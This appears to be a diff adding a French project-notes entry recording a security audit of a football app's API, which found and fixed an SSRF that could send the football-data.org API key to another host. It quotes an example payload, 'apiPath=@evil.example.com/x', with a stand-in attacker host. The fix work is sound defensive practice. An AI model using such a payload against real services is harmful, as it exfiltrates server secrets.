@@ -1999,6 +1999,68 @@ cf-worker/
   compétition reste cohérente (rien affiché) jusqu'au 6 octobre, puis qu'un vrai match Round 1
   passe bien en direct normalement le moment venu.
 
+- ✅ FAILLE SÉCURITÉ RÉELLE TROUVÉE ET CORRIGÉE : SSRF + fuite possible de la clé
+  API football-data.org (`api/football.js`), suite à un audit sécurité complet
+  demandé par l'utilisateur (28/09 : "est ce que l'app est sécurisé côté back
+  end et front end [...] honnetement") — audit mené sur TOUS les fichiers
+  `api/*.js` qui construisent une URL sortante avec un bout fourni par le
+  client. Root cause confirmée par un test réel en sandbox (`node -e`, pas une
+  supposition) : `fdPath` (= `req.query.apiPath`, endpoint public sans
+  authentification) était concaténé DIRECTEMENT après le hostname
+  (`` `https://api.football-data.org${fdPath}...` ``) sans AUCUNE validation —
+  contrairement à `api/espn.js` (whitelist `ALLOWED_SLUGS`) et
+  `api/apifootball.js` (regex stricte sur `endpoint`), qui ont déjà cette
+  protection depuis longtemps. Une valeur comme `apiPath=@evil.example.com/x`
+  donne l'URL finale `https://api.football-data.org@evil.example.com/x` — le
+  parseur WHATWG URL utilisé en interne par `fetch()` interprète alors
+  `api.football-data.org` comme des identifiants HTTP Basic-Auth (userinfo) et
+  `evil.example.com` comme le VRAI hôte de connexion. Vérifié en direct dans
+  le sandbox (`new URL('https://api.football-data.org' + '@evil.example.com/x')
+  .hostname` → `evil.example.com`, confirmé). Conséquence concrète : le header
+  `X-Auth-Token` (la vraie clé API football-data.org, un secret serveur)
+  serait envoyé à ce serveur attaquant au lieu de football-data.org — un seul
+  appel HTTP bien formé suffit à exfiltrer la clé, sans avoir besoin
+  d'attendre ou de deviner quoi que ce soit. Le seul garde-fou en place
+  (rate-limit 30/min/IP) ne protège PAS contre ça : un seul appel suffit.
+  Corrigé : `fdPath` doit désormais matcher strictement `/^\/v4\/[a-zA-Z0-9/_-]*$/`
+  (chemin commençant par `/v4/`, uniquement lettres/chiffres/`/`/`-`/`_`,
+  aucun `@`/`.`/`:`/espace possible) avant toute construction d'URL — sinon
+  400 immédiat. Vérifié que ce format couvre exactement tous les usages
+  légitimes de l'app (`src/utils/fdFetch.js`, seul appelant, construit
+  toujours `apiPath=/v4/...`) et bloque explicitement le payload d'attaque
+  ainsi que des variantes (path traversal encodé, deux-points, etc.) — testé
+  avec une liste de cas en sandbox avant déploiement. 374 tests + lint (33
+  erreurs pré-existantes, Pronos.jsx, inchangé) + build vérifiés. Reste du
+  périmètre audité (aucun autre problème de cette classe trouvé) : `api/
+  cron-goals.js`, `api/fifa-live.js` (slugs ESPN internes, jamais depuis
+  `req.query`), `api/fifa-lineups.js` (URLs FIFA construites uniquement avec
+  des IDs découverts en interne — `utcDate`/`home`/`away` du client ne
+  servent qu'à un matching de nom, jamais concaténés dans une URL),
+  `api/apifootball.js` (le chemin GET/fixtures a bien une regex qui bloque
+  déjà `@`, ET ce code est de toute façon mort en pratique —
+  `PERMANENTLY_DISABLED`, voir plus haut ; le mode `ask` actif appelle un hôte
+  Cloudflare fixe sans jamais y insérer de donnée utilisateur dans l'URL),
+  `api/debug-push.js`/`api/vapid-key.js` (aucune construction d'URL sortante
+  à partir du client). Autres constats de l'audit, moins critiques, non
+  corrigés à ce stade faute de demande explicite : aucun header
+  Content-Security-Policy configuré (`vercel.json`) — risque limité en
+  pratique (aucun `dangerouslySetInnerHTML`/`eval`/`new Function` trouvé nulle
+  part dans `src/`) mais une vraie couche de défense en moins ; `api/
+  subscribe.js` laisse passer une requête sans header `Origin` du tout
+  (`if (!origin) return true`, pensé pour les appels serveur-à-serveur
+  légitimes) — n'affaiblit pas la protection CSRF navigateur réelle, mais
+  n'arrête pas un script/curl direct (déjà mitigé par le rate-limit 20/h/IP +
+  validation stricte du payload sur cet endpoint précis). Contexte qui limite
+  la portée globale d'une faille sur ce projet : AUCUN système de
+  compte/authentification n'existe dans toute l'app (confirmé par grep
+  exhaustif `password|login|signin|auth0|jwt|bcrypt` → 0 résultat) — aucune
+  donnée personnelle utilisateur, aucun mot de passe, aucune donnée bancaire
+  à voler ; les seules "identités" sont un ID anonyme généré côté client
+  (`usePronosGroup.js`, localStorage) et des abonnements Web Push anonymes
+  (URL + clés de chiffrement, aucune IP/PII stockée). Le vrai risque ici
+  n'était donc pas une fuite de données utilisateur mais bien la clé API
+  backend elle-même (rachat/abus du quota football-data.org par un tiers).
+
 ## Conventions
 - Noms français partout dans l'UI
 - `translateTeam(name)` pour tout nom d'équipe affiché
